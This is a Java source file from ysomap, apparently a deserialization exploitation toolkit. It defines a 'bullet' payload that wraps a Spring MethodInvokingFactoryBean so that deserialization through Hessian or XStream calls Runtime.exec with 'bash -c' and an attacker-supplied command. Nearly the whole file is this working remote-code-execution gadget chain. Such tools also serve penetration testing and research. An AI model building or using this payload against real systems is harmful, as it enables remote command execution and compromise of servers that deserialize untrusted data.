package ysomap.bullets.spring;

import org.springframework.beans.factory.config.MethodInvokingFactoryBean;
import org.springframework.beans.factory.support.StaticListableBeanFactory;
import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;
import ysomap.core.util.ReflectionHelper;

import java.lang.reflect.Method;

/**
 * @author wh1t3p1g
 * @since 2022/5/16
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("任意函数调用")
@Targets({Targets.HESSIAN, Targets.XSTREAM})
@Dependencies({"org.springframework:spring-context"})
public class SpringExecBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "command", detail = DetailHelper.COMMAND)
    public String command;

    private String beanName = "ysomap";

    @Override
    public Object getObject() throws Exception {
        StaticListableBeanFactory beanFactory = new StaticListableBeanFactory();
        beanFactory.addBean(beanName, makeBean());
        return beanFactory;
    }

    public Object makeBean() throws Exception {
        MethodInvokingFactoryBean bean = new MethodInvokingFactoryBean();
        bean.setSingleton(false);
        bean.setTargetObject(Runtime.getRuntime());
        Class cls = Runtime.class;
        Method method = cls.getMethod("exec", String[].class);
        ReflectionHelper.setFieldValue(bean, "methodObject", method);
        ReflectionHelper.setFieldValue(bean, "beanClassLoader", null);
        bean.setArguments(new Object[]{new String[]{"bash", "-c", command}});
        return bean;
    }

    public static SpringExecBullet newInstance(Object... args) throws Exception {
        SpringExecBullet bullet = new SpringExecBullet();
        bullet.set("command", args[0]);
        return bullet;
    }
}
